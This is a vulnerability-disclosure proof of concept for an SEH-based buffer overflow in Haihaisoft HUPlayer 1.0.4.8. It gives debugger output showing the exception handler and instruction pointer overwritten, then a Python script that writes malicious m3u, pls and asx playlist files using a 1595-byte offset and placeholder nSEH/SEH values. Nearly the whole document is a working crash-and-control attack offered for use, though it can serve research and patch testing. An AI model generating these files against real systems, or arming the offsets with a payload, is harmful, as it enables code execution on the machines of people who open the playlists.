?#-----------------------------------------------------------------------------#
# Exploit Title: Haihaisoft HUPlayer 1.0.4.8 - Buffer Overflow (SEH)          #
# Date: Mar 25 2014                                                           #
# Exploit Author: Gabor Seljan                                                #
# Software Link: http://www.haihaisoft.com/huplayer.aspx                      #
# Version: 1.0.4.8                                                            #
# Tested on: Windows XP SP3                                                   #
#-----------------------------------------------------------------------------#

# (59c.5c4): Access violation - code c0000005 (first chance)
# First chance exceptions are reported before any exception handling.
# This exception may be expected and handled.
# eax=00000003 ebx=0141897a ecx=44444444 edx=01e28c98 esi=01e28c99 edi=01e28367
# eip=0044754f esp=01e27b3c ebp=0000079d iopl=0         nv up ei pl nz na po nc
# cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202
# *** ERROR: Module load completed but symbols could not be loaded for mpc-hc.exe
# mpc_hc+0x4754f:
# 0044754f 3b69f4          cmp     ebp,dword ptr [ecx-0Ch] ds:0023:44444438=????????
# 0:005> g
# (59c.5c4): Access violation - code c0000005 (first chance)
# First chance exceptions are reported before any exception handling.
# This exception may be expected and handled.
# eax=00000000 ebx=00000000 ecx=43434343 edx=7c9032bc esi=00000000 edi=00000000
# eip=43434343 esp=01e2776c ebp=01e2778c iopl=0         nv up ei pl zr na pe nc
# cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
# 43434343 ??              ???
# 0:005> !exchain
# 01e27780: ntdll!RtlConvertUlongToLargeInteger+7e (7c9032bc)
# 01e28b68: 43434343
# Invalid exception stack at 42424242

#!/usr/bin/python

junk1  = "\x80" * 50;
offset = "\x41" * 1595;
nSEH   = "\x42" * 4;
SEH    = "\x43" * 4;
junk2  = "\x44" * 5000;

evil = "http://{junk1}{offset}{nSEH}{SEH}{junk2}".format(**locals())

for e in ['m3u', 'pls', 'asx']:
  if e is 'm3u':
    poc = evil
  elif e is 'pls':
    poc = "[playlist]\nFile1={}".format(evil)
  else:
    poc = "<asx version=\"3.0\"><entry><ref href=\"{}\"/></entry></asx>".format(evil)
  try:
    print("[*] Creating poc.%s file..." % e)
    f = open('poc.%s' % e, 'w')
    f.write(poc)
    f.close()
    print("[*] %s file successfully created!" % f.name)
  except:
    print("[!] Error while creating exploit file!")